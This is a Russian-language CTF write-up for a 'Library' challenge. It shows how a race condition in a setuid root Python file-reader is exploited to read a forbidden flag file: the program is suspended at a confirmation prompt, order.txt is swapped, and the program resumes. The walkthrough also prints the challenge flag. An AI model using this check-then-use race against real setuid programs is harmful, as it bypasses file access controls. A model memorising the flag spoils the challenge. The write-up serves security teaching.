# Library writeup
Подключаемся по ssh, смотрим, что есть:

```bash
$ ls
order.txt
$ ps
    PID TTY          TIME CMD
     25 pts/0    00:00:00 bash
     30 pts/0    00:00:00 ps
```

Негусто. Посмотрим на заказ книги:
```bash
$ order_book
⚸✤◔ Welcome to the Library ◕✤⚸
Сhoose the book you want to order and write it in order.txt, our librarian will keep your desire up-to-date (but please don't try to get forbidden literature, it's strictly prohibited).
Commands:
   1 - print list of all the books
   2 - order the book (please provide the name in the 'order.txt')
   q - quit
Command:
1
-------- Books --------
  flag.txt
  lazy_boy.txt
  lorem.txt
  wealth_and_poor.txt
-----------------------
Command:
2
There is no such book.
Command:
q
توديع - فراق! أتمنى لك يوما جميلا! Goodbye! Have a nice day! (Please press Ctrl+C)
```

Некий CLI, реализующий чтение файлов. Название желаемого файла нужно класть в **~/order.txt**. Попробуем прочитать какой-нибудь файл:

```bash
$ echo "lorem.txt" > order.txt
$ order_book 
⚸✤◔ Welcome to the Library ◕✤⚸
Сhoose the book you want to order and write it in order.txt, our librarian will keep your desire up-to-date (but please don't try to get forbidden literature, it's strictly prohibited).
Commands:
   1 - print list of all the books
   2 - order the book (please provide the name in the 'order.txt')
   q - quit
Command:
2
Want to proceed? [y/n]:y
---- Book contents ----
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas eu nisl massa. Suspendisse tristique placerat hendrerit. Nunc tempus felis mi, ac sodales nisi tristique eleifend. Phasellus condimentum mattis lectus et posuere. Ut mattis, velit eget dapibus egestas, odio ligula bibendum metus, vel pretium tortor tellus auctor odio. Aliquam venenatis mauris varius vulputate rhoncus. Integer ultrices ut erat id imperdiet. Etiam ipsum nisl, tincidunt id lobortis non, pellentesque et ipsum. Suspendisse mattis enim vulputate, finibus massa a, auctor ligula.

Sed laoreet tincidunt lectus quis ornare. Ut vestibulum mauris nibh, eget sollicitudin odio ornare non. Cras ac accumsan lectus. Morbi ultrices erat at vulputate congue. Mauris ac mi dictum, gravida nibh quis, lobortis ipsum. Nulla facilisi. Vivamus dignissim, nunc sit amet elementum maximus, metus justo efficitur quam, ut euismod nisl libero eget tellus. Phasellus a arcu eget lectus egestas venenatis. Integer vestibulum tellus mollis massa sagittis, venenatis venenatis ex tincidunt. In eu fermentum turpis. Aliquam ornare malesuada posuere. Fusce interdum laoreet velit vel luctus. Suspendisse non risus id est dignissim dapibus. In hac habitasse platea dictumst. Nunc at turpis nunc. Pellentesque imperdiet nisi in odio vulputate, at porta dolor bibendum.

Donec augue nulla, mollis sit amet tellus id, blandit convallis dolor. Quisque dapibus massa ac commodo porttitor. Quisque vulputate turpis in consequat maximus. In pharetra quam vel magna euismod eleifend. Phasellus a felis justo. Mauris vitae sodales sem. Curabitur eleifend orci in finibus mattis. Ut volutpat est id commodo vulputate. Nam bibendum arcu ut eros tempor scelerisque. Donec sodales scelerisque justo a feugiat. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Donec convallis, nisi a rhoncus sodales, sem justo feugiat lacus, vitae consequat lacus diam a magna. Nunc blandit non sem eget consequat. Suspendisse commodo sapien ligula, at bibendum nisl finibus sit amet. Fusce quis odio et ipsum suscipit tristique vitae at mi. Vestibulum vitae magna sit amet mauris auctor facilisis.

Interdum et malesuada fames ac ante ipsum primis in faucibus. Sed hendrerit felis quis nulla mattis porta. Nunc malesuada erat ac nunc egestas pulvinar. Morbi sed dui efficitur, lacinia risus sed, tempor nisi. Donec elementum at arcu in sollicitudin. Cras elementum elit ut massa consequat, quis aliquet sem efficitur. Integer quis aliquam augue, non commodo turpis.

Phasellus hendrerit lacus quis magna efficitur, a dapibus dui aliquet. Fusce eget leo nec velit imperdiet blandit non at dui. Maecenas pulvinar felis at porttitor vehicula. Quisque mollis semper odio, et fringilla lorem rutrum eget. Mauris molestie tempor ipsum, id fringilla ex vestibulum vel. Cras et nunc eros. Etiam ut bibendum sapien, id pharetra ante. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; 

-----------------------
```

Отлично, это работает. Ради интереса попробуем прочитать флаг:

```bash
$ echo "flag.txt" > order.txt
$ order_book 
⚸✤◔ Welcome to the Library ◕✤⚸
Сhoose the book you want to order and write it in order.txt, our librarian will keep your desire up-to-date (but please don't try to get forbidden literature, it's strictly prohibited).
Commands:
   1 - print list of all the books
   2 - order the book (please provide the name in the 'order.txt')
   q - quit
Command:
2
That seems like f0rb1dd3n literature. It's strictly prohibited in the Library.
```

Ожидаемо. Давайте изучать `order_book`. Для начала найдем, где она находится:

```bash
$ which order_book
/usr/bin/order_book
```

Окей, теперь скачаем её себе на локалку:
```bash
$ scp -rP 21009 visitor2@ctf.li2sites.ru:/usr/bin/order_book .
visitor2@ctf.li2sites.ru's password: 
order_book
```

И посмотрим на нее в дизассемблере:
```C
int main(int argc, const char **argv, const char **envp) {
    setuid(0);
    system("/usr/local/share/order_book.py");
    return 0;
}
```

Эта программа просто повышает себя до рута и запускает питоновский скрипт. Вернемся на сервер и посмотрим на [скрипт](deploy/service/order_book.py). Функция `main()`:

```python
def main():
    global books
    books = os.listdir(LIBDIR)
    updater = threading.Thread(target=update_book_to_read,)
    updater.start()

    banner()
    logic()
    print("توديع - فراق! أتمنى لك يوما جميلا! Goodbye! Have a nice day! (Please press Ctrl+C)")
```

Заметим, что **LIBDIR** = "**/books/**". Значит, файлы книг берутся оттуда. Однако, просто так мы их прочитать не можем, так как они принадлежат руту и у остальных юзеров нету привелегий на их чтение:

```bash
$ ls -lah /books/
total 36K
drwxr-xr-x 1 root root 4.0K Nov 29 21:53 .
drwxr-xr-x 1 root root 4.0K Nov 29 21:53 ..
-r-------- 1 root root  122 Nov 29 21:35 flag.txt
-r-------- 1 root root 3.2K Nov 29 21:35 lazy_boy.txt
-r-------- 1 root root 3.0K Nov 29 21:35 lorem.txt
-r-------- 1 root root 2.1K Nov 29 21:35 wealth_and_poor.txt

```

Наиболее интересным моментом является создание потока для функции `update_book_to_read()`. Взглянем на нее:

```python
def update_book_to_read():
    global book_to_order
    try:
        while True:
            f = open("order.txt", "r")
            book_to_order = f.read().strip()
            f.close()
            sleep(1)
    except FileNotFoundError:
        print("order.txt is not found by librarian.")
        os._exit(-1)
```

Раз в секунду она обновляет глобальную переменную **book_to_order**, записывая в нее содержимое **order.txt**. Поищем, где используется эта переменная:

```python
def order_book():
    global book_to_order
    
    try:
        assert book_to_order in books
    except AssertionError:
        print("There is no such book.")
        return

    if "flag" in book_to_order: 
        print("That seems like f0rb1dd3n literature. It's strictly prohibited in the Library.")
    else:
        ans = input("Want to proceed? [y/n]:")
        if ans != "y":
            return
        try:
            f = open(LIBDIR + book_to_order)
        except FileNotFoundError:
            print("There is no such book.")
            return
        data = f.read()

        print("---- Book contents ----")
        print(data)
        print("-----------------------")
        f.close()
```

Это функция чтения книги, вызваемая командой "2". Она читает запрашиваемый через **order.txt** файл, и выводит его содержимое, если выполнено несколько условий:
1. Он есть в списке файлов `books`
2. В названии файла нет `flag.txt`
3. Файл существует

И защиту действительно не обойдешь - она проверяет наличие жеалемого файла в списке, который никак не меняется с момента запуска программы.

Повторим вышесказанное. `update_book_to_read()` каждую секунду обновляет глобальную переменную **book_to_order**, к которой несколько раз обращается `order_book()`. Если наш заказ обновляется "в онлайне", то тогда выходит, что в разные моменты времени переменная **book_to_order** может хранить разные значения _в рамках одного вызова_ `order_book()`. К тому, же, между проверкой на наличие "flag.txt" в названии и самим чтением есть вызов `input()`, что дает неограниченную задержку. Налицо **data race**.

План такой:
1. Записываем в **order.txt** какой-нибудь сущесвующий файл, не являющийся флагом
2. Запускаем **order_book**
3. Заказываем книгу (проходим все проверки, так как книга существует и не является флагом), но не нажимаем "y", приостаналиваем программу (Ctrl+Z)
4. Пишем "flag.txt" в **order.txt**
5. Продолжаем выполнение **order_book** (`fg`)
6. Ждем секунду, `update_book_to_read()` обновляет **book_to_order**
7. Нажимаем "y", программа читает файл, который находится в **book_to_order** => читает **flag.txt**

```bash
$ # step 1
$ echo "lorem.txt" > order.txt
$ # step 2-3
$ order_book 
⚸✤◔ Welcome to the Library ◕✤⚸
Сhoose the book you want to order and write it in order.txt, our librarian will keep your desire up-to-date (but please don't try to get forbidden literature, it's strictly prohibited).
Commands:
   1 - print list of all the books
   2 - order the book (please provide the name in the 'order.txt')
   q - quit
Command:
2
Want to proceed? [y/n]:^Z
[1]+  Stopped                 order_book
$ # step 4
$ echo "flag.txt" > order.txt 
$ # step 5-7
$ fg
order_book
y
---- Book contents ----
You managed to find a treasure of the Libray. Nice job you did!

li2CTF{b00K_15_m0R3_v4lu4bl3_7H4n_a_G0ld,__1_gu355_y0u_4gr33}

-----------------------
```

Флаг: `li2CTF{b00K_15_m0R3_v4lu4bl3_7H4n_a_G0ld,__1_gu355_y0u_4gr33}`
